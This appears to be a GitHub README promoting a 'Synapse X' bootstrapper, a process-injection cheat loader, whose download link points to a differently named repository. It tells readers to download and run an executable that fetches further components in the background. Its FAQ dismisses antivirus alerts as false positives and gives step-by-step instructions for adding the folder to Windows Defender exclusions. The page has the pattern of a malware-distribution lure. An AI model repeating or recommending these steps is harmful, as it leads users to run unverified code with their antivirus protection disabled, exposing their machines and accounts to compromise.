# ⚡ Synapse X — Official Bootstrapper & Loader
---

## 📖 Overview

**Synapse X Bootstrapper** is the official lightweight installer, launcher, and auto-update manager for Synapse X. No more manual archive extractions, missing dependency troubleshooting, or broken file issues — the bootstrapper sets up everything in a single click.

### 🌟 Key Features
* 🚀 **1-Click Setup (Only 260 KB)**: Download a tiny standalone executable that automatically fetches and verifies the latest working build.
* 🔄 **Smart Auto-Updates**: Seamlessly checks GitHub releases on launch and patches only modified files without overwriting user scripts.
* 🖥️ **Desktop Shortcut**: Automatically generates a clean desktop shortcut for quick access.
* 🛡️ **Integrity & Checksum Verification**: Validates downloaded packages before extraction, preventing corrupt files.
* 💎 **Full Synapse X Power**: Monaco multi-tab code editor, 100% UNC environment compatibility, high-performance injection, and built-in script hub.

---

## 📥 Quick Start & Installation

### Option 1. Via Bootstrapper (Recommended ⭐)
1. Go to the [**Releases**]([https://github.com/dwasdz06-design/octane-executor/releases/tag/Bootstrapper) section.
2. Download **`Synapse_installer.exe`**.
3. Run the bootstrapper:
   - It will automatically download all required components in the background.
   - It creates a dedicated directory and a `Synapse X` shortcut on your Desktop.
   - Launches Synapse X, ready for injection!

---

## ❓ Frequently Asked Questions (FAQ & Troubleshooting)

<details>
<summary><b>🛡️ Windows Defender / Antivirus flags the executable</b></summary>
<br>
Any software that injects into another process memory (such as VMT hooks or dynamic DLL injection) is routinely flagged by antivirus heuristic scanners as a generic <i>HackTool / False Positive</i>.
<br><br>
<b>Solution:</b> Add the Synapse directory or <code>SynapseBootstrapper.exe</code> to your Windows Defender exclusions list:
<ol>
  <li>Open <i>Windows Security</i> -> <i>Virus & threat protection</i>.</li>
  <li>Under <i>Virus & threat protection settings</i>, select <i>Manage settings</i>.</li>
  <li>Scroll down to <i>Exclusions</i> -> <i>Add or remove exclusions</i>.</li>
  <li>Click <i>Add an exclusion</i> -> <i>Folder</i> and select your Synapse folder.</li>
</ol>
</details>

<details>
<summary><b>⚙️ System Requirements</b></summary>
<br>
<ul>
  <li><b>Operating System:</b> Windows 10 / 11 (64-bit).</li>
  <li><b>.NET Framework:</b> 4.8 or higher (pre-installed on modern Windows versions).</li>
  <li><b>Visual C++ Redistributable:</b> 2015–2022 (x86 / x64).</li>
</ul>
</details>

<details>
<summary><b>🌐 "Failed to check updates" or "Connection timeout"</b></summary>
<br>
Make sure your network allows connections to GitHub endpoints (`github.com` and `objects.githubusercontent.com`). If you have third-party ad-blockers, firewalls, or strict VPNs enabled, whitelist the application during the initial setup.
</details>

---

<p align="center">
  <sub>Synapse X Project • 2026 • Made with ❤️ for the community</sub>
</p>
